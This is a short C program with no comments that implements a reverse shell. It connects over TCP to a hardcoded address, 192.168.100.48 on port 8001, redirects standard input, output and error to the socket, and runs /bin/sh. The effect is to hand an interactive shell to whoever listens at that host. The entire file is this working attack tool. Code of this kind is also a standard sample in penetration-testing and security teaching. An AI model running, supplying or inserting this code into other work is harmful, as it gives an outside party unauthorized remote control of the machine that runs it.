#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include<netinet/in.h>

#define SERVER_IP "192.168.100.48"
#define PORT 8001

int main(void){
    int fd = socket(AF_INET, SOCK_STREAM, 6);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    connect(fd, (struct sockaddr *) &server_addr, sizeof(server_addr));

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    execve("/bin/sh", NULL, NULL);

    return 0;
}
